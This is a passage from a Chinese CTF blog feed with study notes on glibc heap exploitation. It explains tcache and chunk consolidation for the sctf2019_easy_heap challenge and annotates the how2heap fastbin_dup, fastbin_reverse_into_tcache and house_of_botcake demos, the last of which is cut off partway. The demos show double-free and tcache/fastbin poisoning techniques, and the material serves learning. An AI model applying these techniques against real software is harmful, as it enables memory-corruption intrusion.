      
    </categories>
    
    
    <tags>
      
      <tag>爬虫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sctf2019_easy_heap</title>
    <link href="/2021/11/18/sctf2019_easy_heap/"/>
    <url>/2021/11/18/sctf2019_easy_heap/</url>
    
    <content type="html"><![CDATA[<p>就是一道简单的heap，但要记录下更深的heap源码的理解</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/implementation/tcache/">tcache - CTF Wiki</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="hljs-comment">   for more chunks.  */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure><p>一个free掉会进入tcache bin中的chunk 会被加入到 同样大小的tcache chunk 的链表的头部，同时将entries[tc_idx]&#x3D;e而在malloc一个tcache chunk时，就会拿到链表的头部的chunk。 这样就会使得tcache的进出顺序为：先进后出</p><p>chunk合并：</p><p>这道题涉及到了前向合并：<br>    &#x2F;*<br>      If max_fast is 0, we know that av hasn’t<br>      yet been initialized, in which case do so below<br>    *&#x2F;<br>    &#x2F;&#x2F; 说明 fastbin 已经初始化<br>    if (get_max_fast() !&#x3D; 0) {<br>        &#x2F;&#x2F; 清空 fastbin 标记<br>        &#x2F;&#x2F; 因为要合并 fastbin 中的 chunk 了。<br>        clear_fastchunks(av);<br>        &#x2F;&#x2F;<br>        unsorted_bin &#x3D; unsorted_chunks(av);</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  Remove each chunk from fast bin and consolidate it, placing it</span><br><span class="hljs-comment">  then in unsorted bin. Among other reasons for doing this,</span><br><span class="hljs-comment">  placing in unsorted bin avoids needing to calculate actual bins</span><br><span class="hljs-comment">  until malloc is sure that chunks aren&#x27;t immediately going to be</span><br><span class="hljs-comment">  reused anyway.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// 按照 fd 顺序遍历 fastbin 的每一个 bin，将 bin 中的每一个 chunk 合并掉。</span><br>maxfb = &amp;fastbin(av, NFASTBINS - <span class="hljs-number">1</span>);<br>fb    = &amp;fastbin(av, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">do</span> &#123;<br>    p = atomic_exchange_acq(fb, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>            check_inuse_chunk(av, p);<br>            nextp = p-&gt;fd;<br> <br>            <span class="hljs-comment">/* Slightly streamlined version of consolidation code in</span><br><span class="hljs-comment">             * free() */</span><br>            size      = chunksize(p);<br>            nextchunk = chunk_at_offset(p, size);<br>            nextsize  = chunksize(nextchunk);<br> <br>            <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>                prevsize = prev_size(p);<br>                size += prevsize;<br>                p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>                unlink(av, p, bck, fwd);<br>            &#125;<br> <br>            <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>                <span class="hljs-comment">// 判断 nextchunk 是否是空闲的。</span><br>                nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br> <br>                <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>                    size += nextsize;<br>                    unlink(av, nextchunk, bck, fwd);<br>                &#125; <span class="hljs-keyword">else</span><br>                 <span class="hljs-comment">// 设置 nextchunk 的 prev inuse 为0，以表明可以合并当前 fast chunk。</span><br>                    clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br> <br>                first_unsorted     = unsorted_bin-&gt;fd;<br>                unsorted_bin-&gt;fd   = p;<br>                first_unsorted-&gt;bk = p;<br> <br>                <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>                    p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                    p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                &#125;<br> <br>                set_head(p, size | PREV_INUSE);<br>                p-&gt;bk = unsorted_bin;<br>                p-&gt;fd = first_unsorted;<br>                set_foot(p, size);<br>            &#125;<br> <br>            <span class="hljs-keyword">else</span> &#123;<br>                size += nextsize;<br>                set_head(p, size | PREV_INUSE);<br>                av-&gt;top = p;<br>            &#125;<br> <br>        &#125; <span class="hljs-keyword">while</span> ((p = nextp) != <span class="hljs-number">0</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br></code></pre></td></tr></table></figure><p>也就是我们free的目标的chunk在执行free时，会检查前后的chunk情况，看看能不能合并成一个大的chunk，如果前一块为free状态，那么就可以进行前向合并，这道题我们修改chunk3的pre_inuse位为0，这样在free(3)时我们就可以进行前向合并，这样我们就拿到了一块特别大的chunk，然后再malloc回来原来的chunk，就能得到double free.</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>how2heap部分(libc2.27)</title>
    <link href="/2021/10/15/how2heap_2.27/"/>
    <url>/2021/10/15/how2heap_2.27/</url>
    
    <content type="html"><![CDATA[<h1 id="1-fastbin-dup-c"><a href="#1-fastbin-dup-c" class="headerlink" title="1.fastbin_dup.c"></a>1.fastbin_dup.c</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br> <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);<br> <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fill up tcache first.\n&quot;</span>);<span class="hljs-comment">//是对于fastbin的攻击，所以要先填满tcache</span><br>    <span class="hljs-type">void</span> *ptrs[<span class="hljs-number">8</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">8</span>; i++) &#123;<br>        ptrs[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) &#123;<br>        <span class="hljs-built_in">free</span>(ptrs[i]);<br>    &#125;<br> <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating 3 buffers.\n&quot;</span>);<span class="hljs-comment">//开三个chunk。free后会进入fastbin中</span><br>    <span class="hljs-type">int</span> *a = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-type">int</span> *b = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-type">int</span> *c = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>);<br> <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);<br> <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br> <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);<span class="hljs-comment">//因为libc2.27的保护机制，位于链表首部的chunk如果被free就会引发异常</span><br>    <span class="hljs-comment">// free(a);</span><br> <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);<br>    <span class="hljs-built_in">free</span>(b);<span class="hljs-comment">//free掉b让链表首部改为b</span><br> <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);<br>    <span class="hljs-built_in">free</span>(a);<span class="hljs-comment">//这样就导致a再一次的进入了fastbin中</span><br> <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);<br>    a = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>);<br>    b = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>);<br>    c = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);<br> <br>    assert(a == c);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/how2heap-1.png" alt="how2heap-1"></p><h1 id="2-fastbin-reverse-into-tcache-c"><a href="#2-fastbin-reverse-into-tcache-c" class="headerlink" title="2.fastbin_reverse_into_tcache.c"></a>2.fastbin_reverse_into_tcache.c</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br> <br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> allocsize = <span class="hljs-number">0x40</span>;<br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br> <br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;\n&quot;</span><br>    <span class="hljs-string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span><br>    <span class="hljs-string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span><br>    <span class="hljs-string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span><br>    <span class="hljs-string">&quot;a large unsigned value to the stack.\n\n&quot;</span><br>  );<br> <br>  <span class="hljs-comment">// Allocate 14 times so that we can free later.</span><br>  <span class="hljs-type">char</span>* ptrs[<span class="hljs-number">14</span>];<br>  <span class="hljs-type">size_t</span> i;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">14</span>; i++) &#123;<br>    ptrs[i] = <span class="hljs-built_in">malloc</span>(allocsize);<br>  &#125;<br> <br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span><br>    <span class="hljs-string">&quot;(More than 7 times works fine too.)\n\n&quot;</span><br>  );<br> <br>  <span class="hljs-comment">// Fill the tcache.</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">7</span>; i++) &#123;<br>    <span class="hljs-built_in">free</span>(ptrs[i]);<br>  &#125;<br> <br>  <span class="hljs-type">char</span>* victim = ptrs[<span class="hljs-number">7</span>];<br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span><br>    <span class="hljs-string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span><br>    <span class="hljs-string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,<br>    victim<br>  );<br>  <span class="hljs-built_in">free</span>(victim);<br> <br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span><br>    <span class="hljs-string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span><br>    <span class="hljs-string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span><br>    <span class="hljs-string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span><br>    <span class="hljs-string">&quot;a single free is sufficient.\n\n&quot;</span><br>  );<br> <br>  <span class="hljs-comment">// Fill the fastbin.</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">8</span>; i &lt; <span class="hljs-number">14</span>; i++) &#123;<br>    <span class="hljs-built_in">free</span>(ptrs[i]);<br>  &#125;<br> <br>  <span class="hljs-comment">// Create an array on the stack and initialize it with garbage.</span><br>  <span class="hljs-type">size_t</span> stack_var[<span class="hljs-number">6</span>];<br>  <span class="hljs-built_in">memset</span>(stack_var, <span class="hljs-number">0xcd</span>, <span class="hljs-keyword">sizeof</span>(stack_var));<br> <br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;The stack address that we intend to target: %p\n&quot;</span><br>    <span class="hljs-string">&quot;It&#x27;s current value is %p\n&quot;</span>,<br>    &amp;stack_var[<span class="hljs-number">2</span>],<br>    (<span class="hljs-type">char</span>*)stack_var[<span class="hljs-number">2</span>]<br>  );<br> <br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span><br>    <span class="hljs-string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>,<br>    victim<br>  );<br> <br>  <span class="hljs-comment">//------------VULNERABILITY-----------</span><br> <br>  <span class="hljs-comment">// Overwrite linked list pointer in victim.</span><br>  *(<span class="hljs-type">size_t</span>**)victim = &amp;stack_var[<span class="hljs-number">0</span>];<br> <br>  <span class="hljs-comment">//------------------------------------</span><br> <br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span><br>  );<br> <br>  <span class="hljs-comment">// Empty tcache.</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">7</span>; i++) &#123;<br>    ptrs[i] = <span class="hljs-built_in">malloc</span>(allocsize);<br>  &#125;<br> <br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span><br>    <span class="hljs-string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span><br>  );<br> <br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="hljs-type">char</span>*)stack_var[i]);<br>  &#125;<br> <br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;\n&quot;</span><br>    <span class="hljs-string">&quot;The next allocation triggers the stack to be overwritten. The tcache\n&quot;</span><br>    <span class="hljs-string">&quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\n&quot;</span><br>    <span class="hljs-string">&quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n&quot;</span><br>    <span class="hljs-string">&quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\n&quot;</span><br>    <span class="hljs-string">&quot;address that we are targeting ends up being the first chunk in the tcache.\n&quot;</span><br>    <span class="hljs-string">&quot;It contains a pointer to the next chunk in the list, which is why a heap\n&quot;</span><br>    <span class="hljs-string">&quot;pointer is written to the stack.\n&quot;</span><br>    <span class="hljs-string">&quot;\n&quot;</span><br>    <span class="hljs-string">&quot;Earlier we said that the attack will also work if we free fewer than 6\n&quot;</span><br>    <span class="hljs-string">&quot;extra pointers to the fastbin, but only if the value on the stack is zero.\n&quot;</span><br>    <span class="hljs-string">&quot;That&#x27;s because the value on the stack is treated as a next pointer in the\n&quot;</span><br>    <span class="hljs-string">&quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\n&quot;</span><br>    <span class="hljs-string">&quot;\n&quot;</span><br>    <span class="hljs-string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span><br>  );<br> <br>  <span class="hljs-built_in">malloc</span>(allocsize);<br> <br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="hljs-type">char</span>*)stack_var[i]);<br>  &#125;<br> <br>  <span class="hljs-type">char</span> *q = <span class="hljs-built_in">malloc</span>(allocsize);<br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;\n&quot;</span><br>    <span class="hljs-string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,<br>    q<br>  );<br> <br>  assert(q == (<span class="hljs-type">char</span> *)&amp;stack_var[<span class="hljs-number">2</span>]);<br> <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p> 思路：</p><ol><li><p>malloc出大于7个的chunk（代码上说是越多越好）</p></li><li><p>.free 7个 来填充tcache</p></li><li><p>free掉victim chunk，victim作为第8个，会落入fastbin中，作为首部存在，释放其余的chunk，填入到fastbin中</p></li><li><p>通过其他的漏洞，修改victim的fd指针，让fd指针指向我们想要的位置</p></li><li><p>malloc一次，这时会得到fastbin的末尾chunk，并进行一次chunk从fastbin到tcache的转移</p></li><li><p>victim的fd作为fastbin的第一名，转移到tcache中是末尾，故此时malloc一次就会得到我们想要位置的chunk</p><h1 id="3-house-of-botcake-c"><a href="#3-house-of-botcake-c" class="headerlink" title="3.house_of_botcake.c"></a>3.house_of_botcake.c</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br> <br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * This attack should bypass the restriction introduced in</span><br><span class="hljs-comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span><br><span class="hljs-comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span><br><span class="hljs-comment">     * simple tcache poisoning</span><br><span class="hljs-comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span><br> <br>    <span class="hljs-comment">// disable buffering so _IO_FILE does not interfere with our heap</span><br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br> <br>    <span class="hljs-comment">// introduction</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This attack only relies on double free.\n&quot;</span>);<br> <br>    <span class="hljs-comment">// prepare the target</span><br>    <span class="hljs-type">intptr_t</span> stack_var[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The address we want malloc() to return, namely,&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);<br> <br>    <span class="hljs-comment">// prepare heap layout</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Preparing heap layout&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *x[<span class="hljs-number">7</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(x)/<span 